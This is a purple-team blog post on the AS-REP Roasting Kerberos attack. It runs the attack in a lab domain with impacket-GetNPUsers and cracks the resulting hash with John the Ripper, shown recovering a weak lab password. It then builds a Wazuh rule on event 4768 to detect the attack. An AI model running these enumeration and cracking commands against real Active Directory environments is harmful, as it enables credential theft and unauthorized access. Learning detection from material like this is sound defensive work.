---
title: AS-REP Roasting Detection with Wazuh - MITRE ATT&CK T1558.004
date: 2025-04-27 13:00:00 
last_modified_at: 2025-04-27 13:00:00
categories: [Purple Team,Active Directory & Kerberos Abuse]
tags: [active directory,asrep roasting,hashcat,kerberos,mitre att&ck,cybersecurity,penetration testing,purple team]     # TAG names should always be lowercase
comments: true
image:
  path: /./media/post5/kerberos.png
  alt: "AS-REP Roasting Attack - Kerberos Authentication Exploitation"
author: Ahmed BAHYA
excerpt: "Learn about AS-REP Roasting attack (MITRE ATT&CK T1558.004), a Kerberos authentication exploitation technique. Complete walkthrough with detection and response using Wazuh SIEM."
description: "Comprehensive guide to AS-REP Roasting attack (MITRE ATT&CK T1558.004). Learn how attackers exploit Kerberos pre-authentication, practical demonstration, and detection using Wazuh SIEM for cybersecurity defense."
keywords: [as-rep roasting, kerberos, active directory, mitre att&ck, t1558.004, cybersecurity, penetration testing, purple team, wazuh, siem, detection, response, hashcat, john the ripper]
canonical_url: https://b2hu.me/posts/AS-REP-Roasting-Attack
---
Hello everyone, thank you for being here. In this blog post, I will demonstrate and simulate a very classic yet interessting Active Directory and Kerberos abuse attack: the **AS-REP Roasting** attack. So, let's get started!
## What is Kerberos ?
Kerberos is a network authentication protocol designed to provide strong authentication for client-server applications using ticket-based cryptography. Developed by MIT, it is the default authentication mechanism in Microsoft Active Directory (AD) environments.
### Kerberos components :
Kerberos authentication involves three main components:

- **Key Distribution Center (KDC)** – The central authority that issues tickets, the KDC has two main components :
  - **Authentication Service (AS)** – Verifies user identity and issues Ticket-Granting Tickets (TGTs).
  - **Ticket-Granting Service (TGS)** – Grants service tickets for accessing resources.

- **Client** – The user or service requesting access.

- **Service Server** – The resource the client wants to access (e.g., a file share, SQL server).
### The Kerberos Authentication Flow (simplified) :

1. **AS-REQ** (Authentication Service Request) : – The client requests a TGT from the AS.

2. **AS-REP** (Authentication Service Reply) : – If pre-authentication is enabled, the AS verifies the user’s credentials and sends an encrypted TGT.

3. **TGS-REQ** (Ticket-Granting Service Request) : – The client sends the TGT to the TGS to request a service ticket.

4. **TGS-REP** (Ticket-Granting Service Reply) : – The TGS issues a service ticket for the requested resource.

5. **AP-REQ** (Application Request) : – The client presents the service ticket to the target server.

6. **AP-REP** (Application Reply) : – The server grants access.

this image below represents the kerberos flaw, as stated before :

![screen_1](/./media/post5/krbmsg.gif)

## AS_REP Roasting :
**AS-REP Roasting** exploits a weakness in Kerberos when **pre-authentication** is disabled for a user account. Without pre-authentication, an attacker can request a TGT (no password aka anyone can) for the user and receive an encrypted AS-REP message, which can be cracked offline to reveal the user’s password. Luckily in **Kerberos v5** the preauth is enabled by default and you have to manually disable it, the only reason i think sys admin would disble it is for backward compatibility with Kerberos v4 libraries that might be used by some legacy applications,those account by default do not require a password.
## ATTACK Simulation (AS-REP Roasting Attack Demonstration) :
In this practical demonstration, we'll simulate an **AS-REP Roasting** attack in our test environment and identify **key Indicators of Attack (IoAs)** that would alert defenders to such malicious activity.

**Lab Environment Details:**

- Target Domain: **iccn.ma**

- Vulnerable Account: **iccn.ma/jdoe** (pre-authentication disabled)
the **jdoe** user properties must be set up with preauth disabled just as follows : 

![screen_2](/./media/post5/jdoe_prop.png)

### Attack
for the asrep abuse we'll use the impacket script **GetNPUsers.py** script :
```shell
impacket-GetNPUsers -no-pass iccn.ma/jdoe -dc-ip 10.0.2.16 
```
after execuring this command we'll get the ASREP (TGT + Session key), the session key is the one that's encrypted wiht the user jdoe password's hash.
now we can move to offline cracking, we can use tools like hashcat or JTR (john the ripper), for this demo i'll user JTP with rockyou.txt password list, the command is like this : 
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt tgt.txt 
```
after a while (depending on the domain password policy), we can get this output :
```shell
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      ($krb5asrep$23$jdoe@ICCN.MA)     
1g 0:00:00:00 DONE (2025-04-28 23:28) 6.250g/s 211200p/s 211200c/s 211200C/s katten..redlips
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
as we can see the password of the **iccn/jdoe** user is **Password123** 
and just like that the attacker has now a foothold in your domaina and can perfom even more enumeration to find weakspots.


## Detect & respond to the Attack Using _Wazuh_

every TGT Request to the DC is logged with this **4768**, remember it because we'll need it later when we create detection rules in **_wazuh_**. You can see the event in windows event viewer just like this :

![screen_3](/./media/post5/windows_event.png)

The objective of this detection is to generate alerts whenever an **unauthorized IP** makes a **TGT request** to Domain Controller (DC) accounts that have **pre-authentication disabled**. To achieve this, we'll use Wazuh and its powerful capabilities for customizing detection rules and variables.

By default, Wazuh includes a rule for TGT requests; however, it is set at level 0, which means it does not generate alerts. Instead of modifying this built-in rule, we'll create a child rule that triggers whenever the parent rule fires. This approach gives us better control and flexibility over the detection logic.

Let’s analyze the following rule:

```xml
<var name="acc_no_pre_auth">jdoe</var>
<group name="security_event, windows,">
  <rule id="110002" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4768$</field>
    <field name="win.eventdata.TargetUserName">$acc_no_pre_auth</field>
    <match name="win.eventdata.IpAddress" negate="yes">10.0.2.17</match>
    <options>no_full_log</options>
    <description>Possible ASREP Roast Attack from $(win.eventdata.IpAddress) to a no-preauth account: $(win.eventdata.TargetUserName)</description>
    <mitre>
        <id>T1558.004</id>
    </mitre>
    <info type="link">https://attack.mitre.org/techniques/T1558/004/</info>
  </rule>
</group>
````
This child rule (ID: 110002) is triggered when its parent rule (60103) is matched. It includes conditions aligned with our detection objective:

1. It only triggers if the **TargetUserName** matches an account with pre-authentication disabled, defined in the variable **$acc_no_pre_auth**.
2. It ensures the IpAddress is not equal to the legitimate IP address **10.0.2.17**.

The generated alert includes useful metadata like the MITRE ATT&CK technique ID and a link for further reading.

Next, we simulate the attack from a Linux machine with the IP address 10.0.2.20:

![screen_4](/./media/post5/ifconfig.png)
After using the Impacket script (as in the previous attack simulation). In the Wazuh Dashboard, we can observe that an alert was successfully generated:
![screen_5](/./media/post5/alert.png)
we can further inspect the content of the alert using drilldowns 
![screen_6](/./media/post5/desc_1.png)

## Conclusion
This detection strategy successfully leverages Wazuh’s rule customization and variable substitution capabilities to detect **ASREP Roasting** attacks. By creating a child rule that monitors for TGT requests to accounts with preauthentication disabled—only from unauthorized IPs— we ensure targeted and meaningful alerts without modifying Wazuh’s built-in rules. This approach enhances flexibility and maintains rule integrity. As demonstrated, a simulated ASREP Roasting attempt from an untrusted IP triggered a precise alert, confirming the effectiveness of this method in identifying potential lateral movement or credential dumping attacks in an Active Directory environment.

I hope You have enjoyed reading this blog post,f you have any questions or need help implementing a similar setup, feel free to ask!


